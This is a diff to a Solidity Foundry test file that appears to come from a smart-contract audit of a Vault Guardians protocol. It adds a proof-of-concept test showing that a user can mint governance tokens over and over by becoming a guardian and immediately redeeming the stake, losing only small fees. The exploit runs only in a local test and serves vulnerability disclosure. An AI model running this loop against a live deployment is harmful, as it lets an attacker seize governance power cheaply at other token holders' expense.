@@ -2,6 +2,7 @@
 pragma solidity 0.8.20;
 
 import {Base_Test} from "../../Base.t.sol";
+import {console2} from "forge-std/Test.sol";
 // @audit-info - Unused import
 import {VaultShares} from "../../../src/protocol/VaultShares.sol";
 import {ERC20Mock} from "../../mocks/ERC20Mock.sol";
@@ -77,5 +78,44 @@ contract VaultGuardiansTest is Base_Test {
         vm.expectRevert();
         vaultGuardians.becomeGuardian(allocationData);
         vm.stopPrank();
+    }
+    /**
+     * @notice PoC: Infinite Governance Token Minting.
+     * Shows how to mint indefinite VGT tokens at near-zero cost.
+     */
+    function test_exploitInfiniteGovernanceMinting() public {
+        uint256 iterations = 5;
+        uint256 stakePrice = vaultGuardians.getGuardianStakePrice(); 
+        
+        // Setup capital for multiple iterations (covering fees)
+        uint256 initialBalance = stakePrice * iterations * 2; 
+        deal(address(weth), user, initialBalance);
+        
+        AllocationData memory allocation = AllocationData(1000, 0, 0); // 100% HOLD
+
+        vm.startPrank(user);
+        weth.approve(address(vaultGuardians), type(uint256).max);
+
+        for (uint256 i = 0; i < iterations; i++) {
+            // 1. Pay Stake -> Get VGT (Mint)
+            address vaultAddr = vaultGuardians.becomeGuardian(allocation);
+            VaultShares vault = VaultShares(vaultAddr);
+
+            // 2. Recover Stake immediately (Bypass Registry/Quit)
+            vault.redeem(vault.balanceOf(user), user, user);
+        }
+        vm.stopPrank();
+
+        // Verification
+        uint256 expectedVgt = iterations * stakePrice;
+        assertEq(vaultGuardianToken.balanceOf(user), expectedVgt, "VGT should accumulate");
+        
+        // Attack Cost Analysis (Only DAO fees lost)
+        uint256 totalCost = initialBalance - weth.balanceOf(user);
+        uint256 totalVolume = stakePrice * iterations;
+        console2.log("Cost to mint VGT:", totalCost);
+        
+        // Cost should be < 2% of volume (actually ~0.2%)
+        assertLe(totalCost, totalVolume / 50, "Exploit cost is prohibitively high");
     }
 }
